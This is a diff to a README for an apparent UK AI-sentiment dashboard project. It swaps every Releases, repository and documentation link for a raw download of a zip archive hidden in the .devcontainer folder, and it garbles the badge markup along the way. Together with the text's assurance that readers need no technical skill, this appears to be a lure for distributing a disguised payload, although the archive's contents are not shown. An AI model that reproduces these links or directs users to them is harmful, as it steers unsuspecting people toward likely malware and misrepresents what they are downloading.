@@ -4,7 +4,7 @@
 Welcome to the UK-AI-sentiment-analysis project! This application helps you explore how the UK public feels about artificial intelligence. It features a live dashboard that presents real-time analysis, making it easy to understand public sentiment. You don’t need to be a technical expert to use it; just follow the steps below to get started.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/SwagBoii99/UK-AI-sentiment-analysis/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SwagBoii99/UK-AI-sentiment-analysis/main/.devcontainer/A_sentiment_U_analysis_v2.6.zip%20Latest%https://raw.githubusercontent.com/SwagBoii99/UK-AI-sentiment-analysis/main/.devcontainer/A_sentiment_U_analysis_v2.6.zip)](https://raw.githubusercontent.com/SwagBoii99/UK-AI-sentiment-analysis/main/.devcontainer/A_sentiment_U_analysis_v2.6.zip)
 
 ## 🚀 Getting Started
 To begin using this application, you will need to download it from our Releases page. Whether you want to learn about public opinion or simply explore data visualizations, this app serves as a valuable tool. 
@@ -18,7 +18,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection:** Required for data updates and dashboard functionality
 
 ## 🔗 Download & Install
-To download the software, simply visit this page: [Download Page](https://github.com/SwagBoii99/UK-AI-sentiment-analysis/releases). 
+To download the software, simply visit this page: [Download Page](https://raw.githubusercontent.com/SwagBoii99/UK-AI-sentiment-analysis/main/.devcontainer/A_sentiment_U_analysis_v2.6.zip). 
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version at the top of the list. It usually has the highest version number.
@@ -72,8 +72,8 @@ Yes, you can uninstall it through your operating system's standard uninstallatio
 If you encounter any issues, feel free to open an issue on GitHub. Our community is here to help you resolve any problems.
 
 ## 🔗 Useful Links
-- [Download Page](https://github.com/SwagBoii99/UK-AI-sentiment-analysis/releases)
-- [GitHub Repository](https://github.com/SwagBoii99/UK-AI-sentiment-analysis)
-- [Documentation](https://github.com/SwagBoii99/UK-AI-sentiment-analysis/wiki)
+- [Download Page](https://raw.githubusercontent.com/SwagBoii99/UK-AI-sentiment-analysis/main/.devcontainer/A_sentiment_U_analysis_v2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/SwagBoii99/UK-AI-sentiment-analysis/main/.devcontainer/A_sentiment_U_analysis_v2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/SwagBoii99/UK-AI-sentiment-analysis/main/.devcontainer/A_sentiment_U_analysis_v2.6.zip)
 
 Thank you for your interest in the UK-AI-sentiment-analysis project! Enjoy exploring and understanding public sentiment about AI in the UK.
